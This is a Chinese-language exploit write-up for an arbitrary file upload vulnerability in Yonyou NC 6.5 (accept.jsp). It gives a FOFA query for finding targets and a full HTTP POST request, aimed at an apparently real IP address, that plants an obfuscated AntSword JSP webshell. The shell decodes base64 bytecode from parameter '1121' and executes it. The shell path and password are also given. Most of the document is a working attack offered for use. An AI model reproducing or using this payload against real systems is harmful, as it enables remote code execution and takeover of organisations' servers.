用友NC accept.jsp任意文件上传漏洞

影响版本：用友NC 6.5

fofa语句  icon_hash="1085941792"

上传蚁剑webshell的EXP如下

```
POST /aim/equipmap/accept.jsp HTTP/1.1
Host: 119.45.173.126:8899
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 1221
Content-Type: multipart/form-data; boundary=ac1485f11aa5441defff4ab45b7fb177

--ac1485f11aa5441defff4ab45b7fb177
Content-Disposition: form-data; name="upload"; filename="01356.txt"
Content-Type: text/plain

<%  String HMNBe = request.getParameter("1121");if (HMNBe != null) { class E2545e4k extends/*Z4QW07t509*/ClassLoader { E2545e4k(ClassLoader LW3860) { super(LW3860); } public Class HMNBe(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = "";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010; ccstr = ccstr + (char) aa[i];}Class A4m01 = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A4m01.getMethod(k, String.class).invoke(A4m01.newInstance(), HMNBe);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(HMNBe);}Class aClass = new E2545e4k(Thread.currentThread().getContextClassLoader()).HMNBe(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %>
--ac1485f11aa5441defff4ab45b7fb177
Content-Disposition: form-data; name="fname"

\webapps\nc_web\1.jsp
--ac1485f11aa5441defff4ab45b7fb177--
```

其中webshell名为1.jsp，<%  String等内容为文件内容

<img src="img/POC.jpg" >

Webshell地址：http://xxxxx/1.jsp

<img src="img/webshell.png" >

密码1121 base64解码器





